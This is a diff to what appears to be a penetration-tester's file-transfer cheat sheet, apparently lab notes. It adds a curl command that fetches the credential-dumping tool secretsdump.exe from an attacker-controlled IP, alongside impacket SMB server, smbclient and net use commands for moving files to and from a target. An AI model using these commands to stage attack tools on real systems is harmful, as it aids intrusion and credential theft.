@@ -87,6 +87,9 @@ Import-Module BitsTransfer
 Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
+
+# curl
+curl http://10.10.16.33/secretsdump.exe -o secretsdump.exe
 ```
  > when the Internet Explorer first-launch configuration has not been completed, which prevents the download This can be bypassed using the parameter `-UseBasicParsing`.
  
@@ -270,10 +273,11 @@ sudo impacket-smbserver share -smb2support /tmp/smbshare # share spesifice folde
 
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd` 
-sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test # spesifice folder
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test # spesifice folder + with creds
 
 # or 
 python /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support tmp . 
+
 
 #copy of a file from the shared folder 
 smbclient //HOST/tmp -U guest -c 'get file.txt' # download file
@@ -311,7 +315,7 @@ Windows
 ```bash
 1) # assume you have the necessary permissions to access the shared folder.
 CMD-Wind> net use Z: \\<ServerName>\<SharedFolder>
-CMD-Wind> net use Z: \\<ServerName>\<SharedFolder> /user:<username> <password> #For SMB using credentials
+CMD-Wind> net use Z: \\<ServerName>\<SharedFolder> /user:<username> <password> # For SMB using credentials
 2) #copy using  windwos 
 copy \\<ServerName>\<SharedFolder>\<FileName> <DestinationPath>
 copy C:\path\to\file.txt \\<Linux_IP>\shared\file.txt # from windows to linux
